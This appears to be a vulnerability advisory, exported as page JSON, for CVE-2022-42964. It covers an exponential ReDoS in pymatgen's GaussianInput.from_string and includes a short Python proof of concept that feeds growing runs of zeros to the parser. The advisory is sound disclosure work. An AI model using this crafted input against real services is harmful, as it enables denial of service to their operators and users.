{"hash":"86497c09bdb478776d37c561344cb926afd29421","data":{"post":{"title":"pymatgen ReDoS","path":"/vulnerabilities/pymatgen-redos-xray-257184/","content":"<h2 id=\"summary\"><a href=\"#summary\" aria-hidden=\"true\" tabindex=\"-1\">Summary</a></h2>\n<p>Exponential ReDoS in pymatgen leads to denial of service</p>\n<h2 id=\"component\"><a href=\"#component\" aria-hidden=\"true\" tabindex=\"-1\">Component</a></h2>\n<p><a href=\"https://pypi.org/project/pymatgen\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">pymatgen</a></p>\n<h2 id=\"affected-versions\"><a href=\"#affected-versions\" aria-hidden=\"true\" tabindex=\"-1\">Affected versions</a></h2>\n<p>pymatgen (,)</p>\n<h2 id=\"description\"><a href=\"#description\" aria-hidden=\"true\" tabindex=\"-1\">Description</a></h2>\n<p>An exponential ReDoS (Regular Expression Denial of Service) can be triggered in the pymatgen PyPI package, when an attacker is able to supply arbitrary input to the <code>GaussianInput.from_string</code> method</p>\n<h2 id=\"poc\"><a href=\"#poc\" aria-hidden=\"true\" tabindex=\"-1\">PoC</a></h2>\n<pre><code class=\"language-python\">import time\nfrom pymatgen.io.gaussian import GaussianInput\n\ndef str_and_from_string(i):\n    ans = \"\"\"#P HF/6-31G(d) SCF=Tight SP\n\nH4 C1\n\n0 1\n\"\"\"\n    vulnerable_input = ans + 'C'+'0' * i + '!'+'\\n'\n    GaussianInput.from_string(vulnerable_input)\n\nfor i in range(1000):\n    start = time.time()\n    str_and_from_string(i)\n    print(f\"{i}: Done in {time.time() - start}\")\n</code></pre>\n<h2 id=\"vulnerability-mitigations\"><a href=\"#vulnerability-mitigations\" aria-hidden=\"true\" tabindex=\"-1\">Vulnerability Mitigations</a></h2>\n<p>No mitigations are supplied for this issue</p>\n<h2 id=\"references\"><a href=\"#references\" aria-hidden=\"true\" tabindex=\"-1\">References</a></h2>\n<p><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-42964\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">NVD</a></p>\n","description":"CVE-2022-42964 Medium severity. Exponential ReDoS in pymatgen leads to denial of service","date_published":"2022-10-15","xray_id":"XRAY-257184","vul_id":"CVE-2022-42964","severity":"medium","discovered_by":"Denys Vozniuk","last_updated":"2022-10-15","cvss":5.9}},"context":{}}